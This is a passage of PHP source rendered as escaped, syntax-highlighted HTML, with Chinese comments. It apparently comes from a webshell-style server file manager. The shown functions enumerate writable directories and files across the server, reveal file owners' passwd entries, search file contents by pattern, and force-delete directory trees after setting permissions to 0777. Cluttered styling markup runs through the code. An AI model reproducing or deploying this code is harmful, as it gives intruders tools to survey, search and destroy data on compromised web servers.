  elseif (($mode &amp; 0x1000) === 0x1000) {$type = 'p';}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   else {$type = '?';}\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $owner['read'] = ($mode &amp; 00400) ? 'r' : '-';<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $owner['write'] = ($mode &amp; 00200) ? 'w' : '-';<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $owner['execute'] = ($mode &amp; 00100) ? 'x' : '-';<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $group['read'] = ($mode &amp; 00040) ? 'r' : '-';<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $group['write'] = ($mode &amp; 00020) ? 'w' : '-';<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $group['execute'] = ($mode &amp; 00010) ? 'x' : '-';<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $world['read'] = ($mode &amp; 00004) ? 'r' : '-';<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $world['write'] = ($mode &amp; 00002) ? 'w' : '-';<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $world['execute'] = ($mode &amp; 00001) ? 'x' : '-';<span style=\"color: #f99157; background-color: #515151;\"> </span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if( $mode &amp; 0x800 ) {$owner['execute'] = ($owner['execute']=='x') ? 's' : 'S<span style=\"text-decoration: underline;\">';}</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if( $mode &amp; 0x400 ) {$group['execute'] = ($group['execute']=='x') ? 's' : 'S<span style=\"text-decoration: underline;\">';}</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if( $mode &amp; 0x200 ) {$world['execute'] = ($world['execute']=='x') ? 't' : 'T<span style=\"text-decoration: underline;\">';}</span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read']<span style=\"text-decoration: underline;\">.$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];</span>\n}\n\nfunction getUser($filepath)     {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (function_exists('posix_getpwuid')) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $array = @posix_getpwuid(@fileowner($filepath));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($array &amp;&amp; is_array($array)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return ' / &lt;a href=\"#\" title=\"User: '.$array['name'].'&amp;#13&amp;#10Passwd<span style=\"text-decoration: underline;\">: '.$array['passwd'].'&amp;#13&amp;#10Uid: '.$array['uid'].'&amp;#13&amp;#10gid: '.$array['gid'].'&amp;#13&amp;#10Gecos: '.$array['gecos'].'&amp;#13&amp;#10Dir: '.$array['dir'].'&amp;#13&amp;#10Shell: '.$array['shell'].'\"&gt;'.$array['name'].'&lt;/a&gt;';</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return '';\n}\n\n// &#21024;&#38500;&#30446;&#24405;\nfunction deltree($deldir) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mydir=@dir($deldir);<span style=\"color: #f99157; background-color: #515151;\">   </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while($file=$mydir-&gt;read())     {<span style=\"color: #f99157; background-color: #515151;\">       </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if((is_dir($deldir.'/'.$file)) &amp;&amp; ($file!='.') &amp;&amp; ($file!='..')) {<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @chmod($deldir.'/'.$file,0777);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   deltree($deldir.'/'.$file);<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (is_file($deldir.'/'.$file)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @chmod($deldir.'/'.$file,0777);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @unlink($deldir.'/'.$file);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $mydir-&gt;close();<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @chmod($deldir,0777);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return @rmdir($deldir) ? 1 : 0;\n}\n\n// &#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;\nfunction bg() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $bgc;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return ($bgc++%2==0) ? 'alt1' : 'alt2';\n}\n\n// &#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;\nfunction getPath($scriptpath, $nowpath) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($nowpath == '.') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $nowpath = $scriptpath;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $nowpath = str_replace('\\\\', '/', $nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $nowpath = str_replace('//', '/', $nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (substr($nowpath, -1) != '/') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $nowpath = $nowpath.'/';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $nowpath;\n}\n\n// &#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;\nfunction getUpPath($nowpath) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $pathdb = explode('/', $nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $num = count($pathdb);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($num &gt; 2) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   unset($pathdb[$num-1],$pathdb[$num-2]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $uppath = implode('/', $pathdb).'/';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $uppath = str_replace('//', '/', $uppath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $uppath;\n}\n\n// &#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;\nfunction getcfg($varname) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $result = get_cfg_var($varname);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($result == 0) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return 'No';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif ($result == 1) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return 'Yes';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $result;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\n// &#26816;&#26597;&#20989;&#25968;&#24773;&#20917;\nfunction getfun($funName) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return (false !== function_exists($funName)) ? 'Yes' : 'No';\n}\n\n// &#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;\nfunction getext($file) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $info = pathinfo($file);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $info['extension'];\n}\n\nfunction GetWDirList($dir){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $dirdata,$j,$nowpath;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$j &amp;&amp; $j=1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($dh = opendir($dir)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while ($file = readdir($dh)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $f=str_replace('//','/',$dir.'/'.$file);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_dir($f)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (is_writable($f)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata[$j]['filename']=str_replace($nowpath,'',$f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata[$j]['dirchmod']=getChmod($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata[$j]['dirperm']=getPerms($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata[$j]['dirlink']=$dir;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $dirdata[$j]['server_link']=$f;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $j++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   GetWDirList($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   closedir($dh);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   clearstatcache();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $dirdata;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\nfunction GetWFileList($dir){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $filedata,$j,$nowpath, $writabledb;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$j &amp;&amp; $j=1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($dh = opendir($dir)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while ($file = readdir($dh)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $ext = getext($file);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $f=str_replace('//','/',$dir.'/'.$file);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_dir($f)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   GetWFileList($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_file($f) &amp;&amp; in_array($ext, <span style=\"text-decoration: underline;\">explode(',', $writabledb))){</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (is_writable($f)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['filename']=str_replace($nowpath,'',$f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['size']=sizecount(@filesize($f));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['filechmod']=getChmod($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['fileperm']=getPerms($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['fileowner']=getUser($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['dirlink']=$dir;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['server_link']=$f;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $j++;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   closedir($dh);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   clearstatcache();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return $filedata;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   return array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\nfunction GetSFileList($dir, $content, $re = 0) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   global $filedata,$j,$nowpath, $writabledb;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$j &amp;&amp; $j=1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($dh = opendir($dir)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while ($file = readdir($dh)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $ext = getext($file);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $f=str_replace('//','/',$dir.'/'.$file);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_dir($f)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   GetSFileList($f, $content, $re = 0);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } elseif($file!='.' &amp;&amp; $file!='..' &amp;&amp; is_file($f) &amp;&amp; in_array($ext, <span style=\"text-decoration: underline;\">explode(',', $writabledb))){</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $find = 0;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($re) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ( preg_match('@'.$content.'@',$file) || preg_match('@'.$c<span style=\"text-decoration: underline;\">ontent.'@', @file_get_contents($f)) ){</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $find = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ( strstr($file, $content) || strstr( @file_get_contents($<span style=\"text-decoration: underline;\">f),$content ) ) {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $find = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($find) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['filename']=str_replace($nowpath,'',$f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['size']=sizecount(@filesize($f));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['mtime']=@date('Y-m-d H:i:s',filemtime($f));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['filechmod']=getChmod($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['fileperm']=getPerms($f);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $filedata[$j]['fileowner']=getUser($f);\n<span style=\"color: #999999; background-color: 